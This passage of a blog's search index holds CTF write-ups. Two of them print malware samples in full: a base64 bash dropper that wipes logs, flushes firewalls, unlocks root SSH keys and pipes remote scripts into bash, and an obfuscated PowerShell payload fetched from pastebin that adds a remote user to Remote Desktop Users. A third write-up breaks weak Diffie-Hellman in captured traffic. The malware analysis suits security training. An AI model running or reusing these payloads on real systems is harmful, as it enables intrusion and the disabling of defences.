steps:\u003c/p\u003e","title":"Sloppy Encryptor - Writeup"},{"content":"In this challenge we are given a bash script named sysupdate.sh. Viewing its contents we are met with the following suspicious commands:\necho -n \u0026#34;IyEvYmluL3NoDQp1bGltaXQgLW4gNjU1MzUNCnN1ZG8gcmVib290DQpybSAtcmYgL3Zhci9sb2cvc3lzbG9nDQpjaGF0dHIgLWl1YSAvdG1wLw0KY2hhdHRyIC1pdWEgL3Zhci90bXAvDQpjaGF0dHIgLVIgLWkgL3Zhci9zcG9vbC9jcm9uDQpjaGF0dHIgLWkgL2V0Yy9jcm9udGFiDQp1ZncgZGlzYWJsZQ0KaXB0YWJsZXMgLUYNCmVjaG8gIlExUkdURWxDZTIwMGJERmpNVEIxTlY4MWVUVTNNMjFmZFhCa05EY3pOWDA9IiA+IC90bXAvbG9nX3JvdA0Kc3VkbyBzeXNjdGwga2VybmVsLm5taV93YXRjaGRvZz0wDQplY2hvICcwJyA+IC9wcm9jL3N5cy9rZXJuZWwvbm1pX3dhdGNoZG9nDQplY2hvICdrZXJuZWwubm1pX3dhdGNoZG9nPTAnID4+IC9ldGMvc3lzY3RsLmNvbmYNCnVzZXJkZWwga2V5DQp1c2VyZGVsIHZmaW5kZXINCmNoYXR0ciAtaWFlIC9yb290Ly5zc2gvDQpjaGF0dHIgLWlhZSAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw0Kcm0gLXJmIC90bXAvYWRkcmVzKg0Kcm0gLXJmIC90bXAvd2FsbGUqDQpybSAtcmYgL3RtcC9rZXlzDQppZiBwcyBhdXggfCBncmVwIC1pICdbYV1saXl1bic7IHRoZW4NCgljdXJsIGh4eHA6Ly91cGRhdGUuYWVnaXMuYWxpeXVuLmNvbS9kb3dubG9hZC91bmluc3RhbGwuc2ggfCBiYXNoDQoJY3VybCBoeHhwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaCB8IGJhc2gJDQoJcGtpbGwgYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL2V0Yy9pbml0LmQvYWdlbnR3YXRjaCAvdXNyL3NiaW4vYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL3Vzci9sb2NhbC9hZWdpcyoNCglzeXN0ZW1jdGwgc3RvcCBhbGl5dW4uc2VydmljZQ0KCXN5c3RlbWN0bCBkaXNhYmxlIGFsaXl1bi5zZXJ2aWNlDQoJc2VydmljZSBiY20tYWdlbnQgc3RvcA0KCXl1bSByZW1vdmUgYmNtLWFnZW50IC15DQoJYXB0LWdldCByZW1vdmUgYmNtLWFnZW50IC15DQplbGlmIHBzIGF1eCB8IGdyZXAgLWkgJ1t5XXVuamluZyc7IHRoZW4NCgkvdXNyL2xvY2FsL2djbG91ZC9zdGFyZ2F0ZS9hZG1pbi91bmluc3RhbGwuc2g=\u0026#34; | base64 -d | bash -s We see the script decodes a b64 string and then runs it by piping it to bash.\nLet\u0026rsquo;s follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it. By doing so, we will end up with the following:\n#!/bin/sh ulimit -n 65535 sudo reboot rm -rf /var/log/syslog chattr -iua /tmp/ chattr -iua /var/tmp/ chattr -R -i /var/spool/cron chattr -i /etc/crontab ufw disable iptables -F echo \u0026#34;Q1RGTElCe200bDFjMTB1NV81eTU3M21fdXBkNDczNX0=\u0026#34; \u0026gt; /tmp/log_rot sudo sysctl kernel.nmi_watchdog=0 echo \u0026#39;0\u0026#39; \u0026gt; /proc/sys/kernel/nmi_watchdog echo \u0026#39;kernel.nmi_watchdog=0\u0026#39; \u0026gt;\u0026gt; /etc/sysctl.conf userdel key userdel vfinder chattr -iae /root/.ssh/ chattr -iae /root/.ssh/authorized_keys rm -rf /tmp/addres* rm -rf /tmp/walle* rm -rf /tmp/keys if ps aux | grep -i \u0026#39;[a]liyun\u0026#39;; then curl hxxp://update.aegis.aliyun.com/download/uninstall.sh | bash curl hxxp://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash\tpkill aliyun-service rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service rm -rf /usr/local/aegis* systemctl stop aliyun.service systemctl disable aliyun.service service bcm-agent stop yum remove bcm-agent -y apt-get remove bcm-agent -y elif ps aux | grep -i \u0026#39;[y]unjing\u0026#39;; then /usr/local/gcloud/stargate/admin/uninstall.sh This script seems to be of malicious activity as it drops other scripts and runs it, stops services and modifies existing system files. In the code, we also see another interesting base64 string echo-ed in the /tmp/log_rot file. Decoding it aswell gives us our flag: CTFLIB{m4l1c10u5_5y573m_upd4735}\n","permalink":"http://localhost:1313/ctfwriteups/sysupdate/","summary":"\u003cp\u003eIn this challenge we are given a bash script named sysupdate.sh. Viewing its contents we are met with the following suspicious commands:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -n \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;IyEvYmluL3NoDQp1bGltaXQgLW4gNjU1MzUNCnN1ZG8gcmVib290DQpybSAtcmYgL3Zhci9sb2cvc3lzbG9nDQpjaGF0dHIgLWl1YSAvdG1wLw0KY2hhdHRyIC1pdWEgL3Zhci90bXAvDQpjaGF0dHIgLVIgLWkgL3Zhci9zcG9vbC9jcm9uDQpjaGF0dHIgLWkgL2V0Yy9jcm9udGFiDQp1ZncgZGlzYWJsZQ0KaXB0YWJsZXMgLUYNCmVjaG8gIlExUkdURWxDZTIwMGJERmpNVEIxTlY4MWVUVTNNMjFmZFhCa05EY3pOWDA9IiA+IC90bXAvbG9nX3JvdA0Kc3VkbyBzeXNjdGwga2VybmVsLm5taV93YXRjaGRvZz0wDQplY2hvICcwJyA+IC9wcm9jL3N5cy9rZXJuZWwvbm1pX3dhdGNoZG9nDQplY2hvICdrZXJuZWwubm1pX3dhdGNoZG9nPTAnID4+IC9ldGMvc3lzY3RsLmNvbmYNCnVzZXJkZWwga2V5DQp1c2VyZGVsIHZmaW5kZXINCmNoYXR0ciAtaWFlIC9yb290Ly5zc2gvDQpjaGF0dHIgLWlhZSAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw0Kcm0gLXJmIC90bXAvYWRkcmVzKg0Kcm0gLXJmIC90bXAvd2FsbGUqDQpybSAtcmYgL3RtcC9rZXlzDQppZiBwcyBhdXggfCBncmVwIC1pICdbYV1saXl1bic7IHRoZW4NCgljdXJsIGh4eHA6Ly91cGRhdGUuYWVnaXMuYWxpeXVuLmNvbS9kb3dubG9hZC91bmluc3RhbGwuc2ggfCBiYXNoDQoJY3VybCBoeHhwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaCB8IGJhc2gJDQoJcGtpbGwgYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL2V0Yy9pbml0LmQvYWdlbnR3YXRjaCAvdXNyL3NiaW4vYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL3Vzci9sb2NhbC9hZWdpcyoNCglzeXN0ZW1jdGwgc3RvcCBhbGl5dW4uc2VydmljZQ0KCXN5c3RlbWN0bCBkaXNhYmxlIGFsaXl1bi5zZXJ2aWNlDQoJc2VydmljZSBiY20tYWdlbnQgc3RvcA0KCXl1bSByZW1vdmUgYmNtLWFnZW50IC15DQoJYXB0LWdldCByZW1vdmUgYmNtLWFnZW50IC15DQplbGlmIHBzIGF1eCB8IGdyZXAgLWkgJ1t5XXVuamluZyc7IHRoZW4NCgkvdXNyL2xvY2FsL2djbG91ZC9zdGFyZ2F0ZS9hZG1pbi91bmluc3RhbGwuc2g=\u0026#34;\u003c/span\u003e | base64 -d | bash -s\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe see the script decodes a b64 string and then runs it by piping it to bash.\u003cbr\u003e\nLet\u0026rsquo;s follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it. By doing so, we will end up with the following:\u003c/p\u003e","title":"sysupdate - Writeup"},{"content":"In this test, we are given a \u0026ldquo;.cmd\u0026rdquo; script whose purpose is to upgrade the user\u0026rsquo;s version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let\u0026rsquo;s analyze the file to see what we can find.\nWe observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution. However, just before the exit command, it does something very suspicious:\nIt downloads content from the URL https://pastebin.com/raw/XMRy2Kp4 and saves it into a PowerShell file named safe.ps1. It then executes the newly created file. Therefore, we can easily assume that the next step is to analyze what exists at the URL from the link we discovered earlier. Visiting the link, we find the following PowerShell code:\n$computername = \u0026#34;DESKTOP-5570\u0026#34; Invoke-Command -ComputerName $computername -ScriptBlock { $computer = $env:COMPUTERNAME $domain = \u0026#34;105.10.10.34\u0026#34; $user = ((\u0026#34;{22}{24}{8}{28}{33}{19}{6}{30}{20}{4}{15}{26}{5}{32}{18}{13}{12}{10}{3}{17}{9}{2}{1}{16}{23}{7}{27}{31}{29}{14}{21}{0}{11}{25}\u0026#34; -f \u0026#39;3\u0026#39;,\u0026#39;1n\u0026#39;,\u0026#39;3h\u0026#39;,\u0026#39;urc+\u0026#39;,\u0026#39;urc\u0026#39;,\u0026#39;c+urc3ll3d_7u\u0026#39;,\u0026#39;5_\u0026#39;,\u0026#39;u\u0026#39;,\u0026#39;FL\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;y\u0026#39;,\u0026#39;6s\u0026#39;,\u0026#39;3r\u0026#39;,\u0026#39;my5urc+urc7\u0026#39;,\u0026#39;rc1urc+urcp7}ur\u0026#39;,\u0026#39;v\u0026#39;,\u0026#39;d_7h15\u0026#39;,\u0026#39;urc_\u0026#39;,\u0026#39;3_\u0026#39;,\u0026#39;rc+urcngra7\u0026#39;,\u0026#39;0u_unr4urc+\u0026#39;,\u0026#39;c)\u0026#39;,\u0026#39;(ur\u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39; iEx\u0026#39;,\u0026#39;ur\u0026#39;,\u0026#39;rc+urc5uurc\u0026#39;,\u0026#39;AG{C\u0026#39;,\u0026#39;crurc+u\u0026#39;,\u0026#39;Y\u0026#39;,\u0026#39;+urc5_5\u0026#39;,\u0026#39;rc+urch\u0026#39;,\u0026#39;0u\u0026#39;)).REplAcE(\u0026#39;urc\u0026#39;,[striNg][ChAR]39).REplAcE(([ChAR]51+[ChAR]54+[ChAR]115),\u0026#39;|\u0026#39;)|\u0026amp;( $VERboSePrEfeRENCE.ToSTrinG()[1,3]+\u0026#39;X\u0026#39;-JoiN\u0026#39;\u0026#39;) $group = [ADSI]\u0026#34;WinNT://$computer/Remote Desktop Users,group\u0026#34; $group.psbase.Invoke(\u0026#34;add\u0026#34;,([ADSI]\u0026#34;WinNT://$domain/$user\u0026#34;).Path) } This code appears to be attempting to add a remote user to the victim\u0026rsquo;s computer. The unusual part is the username it is trying to add, as it is not straightforward but is built using obfuscation techniques.\nWhile recovering the name may seem difficult, it is actually quite straightforward. All we need to do is copy that specific line and execute it inside a PowerShell terminal, as at the end of the command, it joins the total string, printing it to the screen.\nAnd like this, we get the flag: FLAG{C0ngra75_Y0u_unr4v3ll3d_7h3_my573ry_b3h1nd_7h15_5u5_5cr1p7}\n","permalink":"http://localhost:1313/ctfwriteups/upgradingwindows/","summary":"\u003cp\u003eIn this test, we are given a \u0026ldquo;.cmd\u0026rdquo; script whose purpose is to upgrade the user\u0026rsquo;s version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let\u0026rsquo;s analyze the file to see what we can find.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/pmdk/upgradingwindows/upgradingWindows1.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eWe observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution. However, just before the exit command, it does something very suspicious:\u003c/p\u003e","title":"Upgrading Windows - Writeup"},{"content":"Based on the description of the challenge, we need to decrypt some messages that seem to be encrypted.\nPcap files can be viewed by a software named Wireshark. Downloading both the challenge file and the software, we can finally view it:\nWe can see a lot of ICMP packets and some UDP packets as well. More specifically, we can see that a pattern is created, where every 13-16 ICMP packets, two UDP packets are being exchanged. Moreover, all UDP packets contain only two hosts:\n192.168.1.101 192.168.1.102 Usually, to view data exchanged over a packet, we have to click on one and look at the hexdump of the packet:\nInspecting all ICMP packets won’t lead us to anything useful. UDP packets on the other hand seem like they contain what we are looking for:\nUsing the “data” in the Wireshark filter bar, we get all the packets that contain data inside the packets. And as it turns out, all packets that contain data are UDP packets:\nUntil the packet No. 67 from the previous image, all messages are in plaintext format. The messages are:\nHey Bob what\u0026rsquo;s up:) Hey Alice:), not much. What about you? Well, i was actually trying this challenge called weak legacy at the CTFLIB platform and im kinda stuck. I was hopping for some help Of course. To be honest, i haven\u0026rsquo;t really solved this myself but i got the flag from a friend. If you\u0026rsquo;d like, i can send it to you. But it would be safer for us to start encrypting our messages so that no one else gets the flag Yeah sure! DH64? Sounds fine, here you go \u0026lsquo;p\u0026rsquo;:15081801184129193989 , \u0026lsquo;g\u0026rsquo;:2, \u0026lsquo;A\u0026rsquo;:10108766542893374992 B\u0026rsquo;:3567237346515547599 . Let’s just XOR our messages with the key Then, the messages appear encrypted. But until this point, we have all the information needed to break the encryption scheme. We know:\nKey exchange algorithm: Diffie-Hellman 64-bit (DH64). p = 15081801184129193989 g = 2 A = 10108766542893374992 B = 3567237346515547599 Message encryption: XOR operation with the shared secret So, we need to find the shared secret from Diffie-Hellman based on the variables that got exchanged and then simply XOR the encrypted messages with this key.\nTo find the shared secret, we must first find either the private key a or b of Alice or Bob.\nSearching for vulnerabilities in DH64, we end up in the following stack exchange forum, which states:\nThis post can be found at:\nhttps://crypto.stackexchange.com/questions/99519/64-bit-key-size-diffie-hellman Basically, with a small key such as the one we have found, discrete logarithm problem security is lost. So it means we can compute the discrete logarithm in one of the two public keys and find a private key of either Alice or Bob. Information on how to compute the discrete logarithm in python can be found at:\nhttps://stackoverflow.com/questions/1832617/calculate-discrete-logarithm One way to solve the challenge is with the following code:\nThis script takes the p, A, g, B variables and tries to calculate either private key a or private key b. After it finds one, it calculates the shared secret and returns it. It then makes a XOR operation on the encrypted message with the key found and returns the decrypted message. Let’s see an example with the first encrypted message:\nWe first take the hex value of the encrypted message and then paste it in the c variable of the script:\nDoing the same process for each message, we end up with the following decrypted conversation:\nwhere we can spot the flag: CTFLIB{5m4ll_k3y5_n0_3ncryp710n}\n","permalink":"http://localhost:1313/ctfwriteups/weaklegacy/","summary":"\u003cp\u003eBased on the description of the challenge, we need to decrypt some messages that seem to be encrypted.\u003cbr\u003e\nPcap files can be viewed by a software named Wireshark. Downloading both the challenge file and the software, we can finally view it:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/weaklegacy/weaklegacy1.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eWe can see a lot of ICMP packets and some UDP packets as well. More specifically, we can see that a pattern is created, where every 13-16 ICMP packets, two UDP packets are being exchanged.\nMoreover, all UDP packets contain only two hosts:\u003c/p\u003e","title":"Weak Legacy - Writeup"}]